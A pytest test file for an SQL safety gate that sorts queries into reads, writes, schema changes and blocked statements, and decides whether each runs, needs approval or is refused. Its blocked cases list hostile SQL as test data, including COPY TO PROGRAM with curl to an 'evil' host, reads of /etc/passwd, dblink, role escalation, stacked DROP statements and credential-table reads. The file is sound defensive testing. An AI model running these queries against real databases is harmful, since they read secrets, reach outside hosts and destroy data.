"""The SQL safety gate: what may run, what needs approval, what is always refused."""

import pytest

from app.datasources.sqlgate import Hidden, check, decide

HIDDEN = Hidden(tables={"staff_secrets"}, columns={"customers": {"email"}})


def kind(sql: str, dialect: str = "postgres") -> str:
    return check(sql, dialect, row_limit=100, hidden=HIDDEN).kind


@pytest.mark.parametrize("dialect", ["postgres", "mysql"])
@pytest.mark.parametrize("sql", [
    "SELECT status, COUNT(*) FROM orders GROUP BY status",
    "SELECT name FROM customers WHERE city = 'Chennai'",
    "SELECT count(*) FROM customers",  # count(*) is fine even with hidden columns
    "SELECT 1 UNION SELECT 2",
    "WITH t AS (SELECT * FROM orders) SELECT * FROM t",
])
def test_reads(sql, dialect):
    assert kind(sql, dialect) == "read"


@pytest.mark.parametrize("sql", [
    "UPDATE orders SET status = 'shipped' WHERE id = 5",
    "DELETE FROM orders WHERE id = 6",
    "INSERT INTO orders VALUES (8, 1, 'pending', '2026-04-01')",
    # a write hidden inside a read is still a write
    "WITH x AS (DELETE FROM orders WHERE id = 1 RETURNING *) SELECT * FROM x",
])
def test_writes(sql):
    assert kind(sql) == "write"


@pytest.mark.parametrize("sql", [
    "CREATE TABLE notes (id int)",
    "ALTER TABLE orders ADD COLUMN note text",
    "DROP TABLE orders",
    "TRUNCATE orders",
    "CREATE INDEX ix ON orders (status)",
    "SELECT * INTO copy_of_orders FROM orders",  # creates a table
])
def test_schema_changes(sql):
    assert kind(sql) == "ddl"


@pytest.mark.parametrize("sql,dialect", [
    ("SELECT 1; DROP TABLE orders", "postgres"),  # stacked statements
    ("SELECT 1; DELETE FROM orders WHERE id = 1", "mysql"),
    ("UPDATE orders SET status = 'x'", "postgres"),  # no WHERE: every row
    ("DELETE FROM orders", "mysql"),
    ("GRANT ALL ON orders TO someone", "postgres"),
    ("CREATE ROLE intruder", "postgres"),
    ("DROP USER app", "postgres"),
    ("DROP DATABASE shop", "postgres"),
    ("CREATE FUNCTION f() RETURNS int AS $$ SELECT 1 $$ LANGUAGE sql", "postgres"),
    ("COPY orders TO PROGRAM 'curl evil'", "postgres"),
    ("SELECT pg_read_file('/etc/passwd')", "postgres"),
    ("SELECT lo_import('/etc/passwd')", "postgres"),
    ("SELECT query_to_xml('DELETE FROM orders', true, true, '')", "postgres"),  # hidden SQL
    ("SELECT dblink('host=evil', 'SELECT 1')", "postgres"),
    ("SELECT set_config('role', 'postgres', false)", "postgres"),
    ("SET ROLE postgres", "postgres"),
    ("SELECT * FROM t INTO OUTFILE '/tmp/x'", "mysql"),
    ("LOAD DATA INFILE '/etc/passwd' INTO TABLE t", "mysql"),
    ("SELECT load_file('/etc/passwd')", "mysql"),
    ("SELECT user, host FROM mysql.user", "mysql"),
    ("SELECT * FROM pg_catalog.pg_authid", "postgres"),
    ("SELECT * FROM staff_secrets", "postgres"),  # hidden table
    ("SELECT x FROM (SELECT login AS x FROM staff_secrets) s", "postgres"),  # ... in a subquery
    ("SELECT email FROM customers", "postgres"),  # hidden column
    ("SELECT * FROM customers", "postgres"),  # * would include the hidden column
    ("CALL do_things()", "postgres"),
    ("DO $$ BEGIN DELETE FROM orders; END $$", "postgres"),
    ("", "postgres"),
])
def test_blocked(sql, dialect):
    assert kind(sql, dialect) == "blocked"


def test_comment_tricks_stay_one_statement():
    r = check("SELECT 1 /* ; DROP TABLE orders */", "postgres", row_limit=10)
    assert r.kind == "read"
    r = check("SELECT 1 -- ; DROP TABLE orders", "postgres", row_limit=10)
    assert r.kind == "read" and r.sql.endswith("LIMIT 11")  # LIMIT on its own line


def test_reads_get_a_row_cap():
    assert check("SELECT * FROM orders", "postgres", row_limit=50).sql.endswith("LIMIT 51")
    assert check("SELECT * FROM orders LIMIT 5", "mysql", row_limit=50).sql.endswith("LIMIT 5")


def test_update_preview_target():
    r = check("UPDATE orders SET status = 'shipped' WHERE id = 5", "postgres", row_limit=10)
    assert r.target == "orders" and r.where == "id = 5"


@pytest.mark.parametrize("kind_,policy,expected", [
    ("read", "read_only", "run"), ("read", "ask", "run"), ("read", "auto", "run"),
    ("write", "read_only", "refuse"), ("write", "ask", "approval"), ("write", "auto", "run"),
    ("ddl", "read_only", "refuse"), ("ddl", "ask", "approval"),
    ("ddl", "auto", "approval"),  # schema changes always need approval
    ("blocked", "auto", "refuse"), ("blocked", "ask", "refuse"),
])
def test_decide(kind_, policy, expected):
    assert decide(kind_, policy) == expected
